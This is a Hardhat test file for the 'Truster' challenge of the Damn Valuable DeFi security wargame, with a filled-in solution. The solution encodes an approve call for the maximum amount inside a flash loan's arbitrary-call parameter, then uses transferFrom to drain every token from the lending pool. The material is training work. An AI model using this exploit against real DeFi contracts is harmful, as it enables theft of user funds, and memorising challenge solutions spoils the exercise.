const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution Truster', async function () {
        /** CODE YOUR SOLUTION HERE */
        // If we target the token contract to call one of its function and call approve, we can manipulate the
        // allowance of the contract for the amount we want to the address we want

        // Data to call approve with being the amount type(uint256).max = 0xffff...ffff and the spender player address
        // approve(address, uint256) function selector = 095ea7b3
        data = "0x095ea7b3" + "000000000000000000000000" + player.address.toString().substring(2) + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        await pool.connect(player).flashLoan(0, player.address, token.address, data);

        //Now player is approved to spend all the pool tokens
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL)
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

